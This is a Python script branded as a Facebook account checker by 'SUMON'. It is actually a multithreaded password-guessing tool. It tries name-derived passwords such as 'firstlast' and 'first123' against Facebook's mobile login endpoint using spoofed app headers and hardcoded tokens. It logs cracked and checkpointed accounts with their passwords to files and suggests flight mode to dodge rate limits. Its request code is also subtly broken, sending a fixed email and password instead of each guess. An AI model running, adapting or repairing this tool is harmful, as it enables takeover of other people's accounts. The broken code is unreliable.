import requests
import json
import time
import sys
import random
import uuid
import os
from concurrent.futures import ThreadPoolExecutor as ThreadPool

# Global variables
oks = []
cps = []
loop = 0
idz = []
plist = []

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def linex():
    print("-" * 50)

def banner():
    clear()
    banner_text = """
    ╔═══════════════════════════════════════════════════════╗
    ║                                                       ║
    ║      ███████╗██╗   ██╗███╗   ███╗ ██████╗ ███╗   ██╗  ║
    ║      ██╔════╝██║   ██║████╗ ████║██╔═══██╗████╗  ██║  ║
    ║      ███████╗██║   ██║██╔████╔██║██║   ██║██╔██╗ ██║  ║
    ║      ╚════██║██║   ██║██║╚██╔╝██║██║   ██║██║╚██╗██║  ║
    ║      ███████║╚██████╔╝██║ ╚═╝ ██║╚██████╔╝██║ ╚████║  ║
    ║      ╚══════╝ ╚═════╝ ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝  ║
    ║                                                       ║
    ║            Facebook Account Checker Tool              ║
    ║                   Version 1.0                         ║
    ║                  Author: SUMON                         ║
    ╚═══════════════════════════════════════════════════════╝
    """
    print("\033[1;32m" + banner_text + "\033[1;37m")
    linex()

def freefb(uid, name, pwx, tl):
    global loop, oks, cps
    
    sys.stdout.write(f"\r\033[1;37m [SUMON-M1] [{loop}] [OK:{len(oks)}] [CP:{len(cps)}]\r")
    sys.stdout.flush()
    
    try:
        first = name.split(" ")[0]
        try:
            last = name.split(" ")[1]
        except:
            last = first
        
        for ps in pwx:
            pw = ps.replace("first", first).replace("last", last).lower()
            
            # Generate dynamic values
            current_time = str(int(time.time()))
            passwordd = f"#PWD_FB4A:0:{current_time}:{pw}"
            password = f"#PWD_FB4A:0:{current_time}:sumon@12M"
            
            # Generate unique device IDs
            adid = str(uuid.uuid4()).upper()
            device_id = str(uuid.uuid4()).upper()
            family_device_id = str(uuid.uuid4()).upper()
            advertiser_id = str(uuid.uuid4()).upper()
            
            # Headers dictionary
            headers = {
    'Priority': 'u=3, i',
    'Authorization': 'OAuth null',
    'X-FB-Connection-Quality': 'GOOD',
    'X-FB-SIM-HNI': '47007',
    'X-FB-Net-HNI': '47002',
    'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 14; TECNO CK7n Build/UP1A.231005.007) [FBAN/FB4A;FBAV/370.0.0.23.112;FBPN/com.facebook.katana;FBLC/en_US;FBBV/374931177;FBCR/Airtel;FBMF/TECNO;FBBD/TECNO;FBDV/TECNO CK7n;FBSV/14;FBCA/arm64-v8a:null;FBDM/{density=2.7375,width=1080,height=2292};FB_FW/1;FBRV/0;]',
    # 'Content-Encoding': 'gzip',  # REMOVED - requests handles this automatically
    'Host': 'b-graph.facebook.com',
    'Content-Type': 'application/x-www-form-urlencoded',
    'X-FB-Connection-Type': 'MOBILE.LTE',
    'x-fb-device-group': '701',
    'X-Tigon-Is-Retry': 'False',
    'X-FB-Friendly-Name': 'authenticate',
    'X-FB-Request-Analytics-Tags': 'unknown',
    'X-FB-HTTP-Engine': 'Liger',
    'X-FB-Client-IP': 'True',
    'X-FB-Server-Cluster': 'True',
    'Connection': 'keep-alive',
    'Accept-Encoding': 'gzip, deflate',  # Let requests handle compression
}
            
            # Data payload
            data = {
    'adid': '01a378a8-2b90-498a-bdf1-ae0359bcd2c4',
    'format': 'json',
    'device_id': 'a143397c-0621-4803-a8e5-fcce42e40197',
    'email': '61578494318368',
    'password': password,
    'generate_analytics_claim': '1',
    'community_id': '',
    'cpl': 'true',
    'try_num': '1',
    'cds_experiment_group': '-1',
    'family_device_id': 'd3e35bd2-fe96-4678-b809-af07741237cb',
    'secure_family_device_id': '441d9943-87fc-4ab8-aa47-65c4b7ce2c9f',
    'sim_serials': '["3a:fa:04:81:8a:f9"]',
    'credentials_type': 'password',
    'fb4a_shared_phone_cpl_experiment': 'fb4a_shared_phone_nonce_cpl_at_risk_v3',
    'fb4a_shared_phone_cpl_group': 'enable_v3_at_risk',
    'enroll_misauth': 'false',
    'generate_session_cookies': '1',
    'error_detail_type': 'button_with_disabled',
    'source': 'login',
    'generate_machine_id': '1',
    'jazoest': '22271',
    'meta_inf_fbmeta': 'NO_FILE',
    'advertiser_id': '01a378a8-2b90-498a-bdf1-ae0359bcd2c4',
    'encrypted_msisdn': 'Ae8zzUIz7jzFEdYZ_MfSxNpfJWWf7sEjY1NcPkmF77iy5htR_9up5PTD5F_uiQSsTCZcpD6rkVKsXX2cruVjuomJSgv_6CL0D4W8NgP4t0l2RP7KEaCvZMfTSfs480JL0VxLr2pOTnPU0pWtqQG1BE3UX5lYgtmL60shj5eL4tK1OzKSUzVjy_FPAw6SR7bw1Lw9-j9ZJDnDyTYN30pSSbLnMMZbU9wDeEWpqRmFWt2FieCt1NCk22eRtTagf0_SZr77UhSVsCyCZpOWv3ZokAaubmoZzdePyaj36KeapwcqWnt9hpkv9CuFc_PoCnKyx7cIPAnx-sGkYvCP8XYMjUIp',
    'currently_logged_in_userid': '0',
    'locale': 'en_US',
    'client_country_code': 'BD',
    'fb_api_req_friendly_name': 'authenticate',
    'fb_api_caller_class': 'Fb4aAuthHandler',
    'api_key': '882a8490361da98702bf97a021ddc14d',
    'sig': '80272038ac17dd62a2e00dc4a78b45c7',
    'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
}

            
            # Make the request
            try:
                response = requests.post(
                    'https://b-graph.facebook.com/auth/login',
                    headers=headers,
                    data=data,
                    allow_redirects=False,
                    timeout=30
                )
                
                # Parse response
                if response.status_code == 200:
                    try:
                        q = response.json()
                        
                        if 'access_token' in q:
                            print(f"\n\033[1;32m✅ [OK] {uid} | {pw}\033[1;37m")
                            oks.append(uid)
                            
                            # Save to file
                            with open('/sdcard/SUMON-M1-OK.txt', 'a') as f:
                                f.write(f'{uid}|{pw}\n')
                            break
                            
                        elif 'error' in q:
                            error_msg = q['error'].get('message', '')
                            print(f"\n\033[1;33m⚠️ [error_msg] {error_msg}")
                            if 'www.facebook.com' in error_msg:
                                print(f"\n\033[1;33m⚠️ [CP] {uid} | {pw}\033[1;37m")
                                cps.append(uid)
                                with open('/sdcard/SUMON-CP.txt', 'a') as f:
                                    f.write(f'{uid}|{pw}\n')
                                break
                            elif 'invalid' in error_msg.lower():
                                continue
                            else:
                                continue
                        else:
                            continue
                            
                    except json.JSONDecodeError:
                        continue
                else:
                    continue
                    
            except requests.exceptions.RequestException as e:
                time.sleep(5)
                continue
                
        loop += 1
        
    except Exception as e:
        print(f"\n\033[1;31mError: {e}\033[1;37m")
        time.sleep(5)

def f_clone():
    clear()
    print("\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : /sdcard/file.txt ")
    linex()
    file_x = input("\033[1;32m[\033[1;31m✓\033[1;32m] Enter FILE PATH : ")
    try:
        file_idz = open(file_x, "r").read().splitlines()
    except:
        exit("\033[1;32m[\033[1;31m✓\033[1;32m] FILE NOT FOUND ")
    
    for x in file_idz:
        idz.append(x)
    
    clear()
    print(f"\033[1;32m [1] METHOD 1 ")
    linex()
    m = input(f"\033[1;32m [-] SELECT : ")
    clear()
    print(f"\033[1;32m [1] CRACK WITH AUTO PASS ")
    print(f"\033[1;32m [2] CRACK WITH MANUAL PASS ")
    linex()
    p = input("\033[1;32m[\033[1;31m✓\033[1;32m] SELECT : ")
    
    if p == "1":
        plist.append("firstlast")
        plist.append("first1234")
        plist.append("firstlast123")
        plist.append("first123")
        plist.append("59039200")
        plist.append("57273200")
        plist.append("first@12")
    else:
        clear()
        print("\033[1;32m[\033[1;31m✓\033[1;32m] MAXIMUM LIMIT : (10) ")
        linex()
        plimit = int(input("\033[1;32m[\033[1;31m✓\033[1;32m] ENTER PASSWORD LIMIT : "))
        clear()
        print("\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : first123, first1234, first12345 ")
        linex()
        for SUMON in range(plimit):
            ap = input(f" [{SUMON+1}] ENTER PASSWORD : ")
            plist.append(ap)
    
    with ThreadPool(max_workers=50) as SUMON_xd:
        clear()
        tl = str(len(idz))
        print("\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL ACCOUNTS : "+tl)
        print("\033[1;32m[\033[1;31m✓\033[1;32m] PROCESS HAS BEEN STARTED ")
        print("\033[1;32m[\033[1;31m✓\033[1;32m] USE FLIGHT MODE FOR MORE OK IDZ ")
        linex()
        for love in idz:
            if "|" in love:
                uid, name = love.split("|", 1)
                pwx = plist
                if m == "1":
                    SUMON_xd.submit(freefb, uid, name, pwx, tl)
                else:
                    # SUMON_xd.submit(graph, uid, name, pwx, tl)  # Define graph function if needed
                    pass
    
    linex()
    print("\033[1;32m[\033[1;31m✓\033[1;32m] PROCESS HAS BEEN COMPLETED ")
    print("\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL OK ACCOUNTS : "+str(len(oks)))
    print("\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL CP ACCOUNTS : "+str(len(cps)))
    linex()
    input("\033[1;32m[\033[1;31m✓\033[1;32m] PRESS ENTER TO EXIT TOOL ")

def start():
    """Main start function to initialize the tool"""
    banner()
    print("\033[1;32m[\033[1;31m✓\033[1;32m] Starting Facebook Account Checker Tool...\033[1;37m")
    time.sleep(1)
    
    # Check for internet connection
    try:
        requests.get("https://www.google.com", timeout=5)
        print("\033[1;32m[\033[1;31m✓\033[1;32m] Internet Connection: OK\033[1;37m")
    except:
        print("\033[1;31m[\033[1;31m✗\033[1;31m] Internet Connection: FAILED\033[1;37m")
        print("\033[1;33m[!] Please check your internet connection and try again\033[1;37m")
        time.sleep(3)
        sys.exit(1)
    
    time.sleep(1)
    
    # Create necessary directories
    if not os.path.exists('/sdcard'):
        try:
            os.makedirs('/sdcard', exist_ok=True)
            print("\033[1;32m[\033[1;31m✓\033[1;32m] Directory created: /sdcard\033[1;37m")
        except:
            print("\033[1;33m[!] Using current directory for output files\033[1;37m")
    
    time.sleep(1)
    
    # Show tool information
    print("\033[1;32m[\033[1;31m✓\033[1;32m] Tool Information:\033[1;37m")
    print(f"    - Threads: 50")
    print(f"    - Output directory: /sdcard/")
    print(f"    - OK accounts file: SUMON-M1-OK.txt")
    print(f"    - CP accounts file: SUMON-CP.txt")
    linex()
    time.sleep(2)
    
    # Start the main function
    try:
        f_clone()
    except KeyboardInterrupt:
        print("\n\033[1;31m[\033[1;31m!\033[1;31m] Process interrupted by user\033[1;37m")
        print(f"\033[1;32m[\033[1;31m✓\033[1;32m] Total OK accounts: {len(oks)}\033[1;37m")
        print(f"\033[1;32m[\033[1;31m✓\033[1;32m] Total CP accounts: {len(cps)}\033[1;37m")
        sys.exit(0)
    except Exception as e:
        print(f"\n\033[1;31m[!] Error: {e}\033[1;37m")
        sys.exit(1)

# Run the tool
if __name__ == "__main__":
    start()
